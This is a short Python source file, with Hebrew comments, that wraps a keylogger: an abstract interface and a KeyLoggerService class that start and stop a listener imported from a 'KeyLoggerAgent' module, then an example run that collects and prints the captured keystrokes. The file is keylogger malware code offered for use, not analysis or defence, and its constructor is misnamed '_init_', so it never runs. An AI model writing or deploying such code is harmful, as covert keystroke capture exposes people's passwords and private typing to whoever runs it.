from abc import ABC, abstractmethod
from typing import List
import time
from KeyLoggerAgent import Listener, logged_keys


class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass


class KeyLoggerService(IKeyLogger):
    def _init_(self):
        self._active = False

    def start_logging(self):
        Listener.start()
        self._active = True

    def stop_logging(self):
        Listener.stop()
        self._active = False

    def get_logged_keys(self) -> List[str]:
        return list(logged_keys)


# שימוש לדוגמה

keylogger = KeyLoggerService()
keylogger.start_logging()

while Listener.is_alive():
    time.sleep(0.5)

print("נאספו מקשים:")
print("".join(keylogger.get_logged_keys()))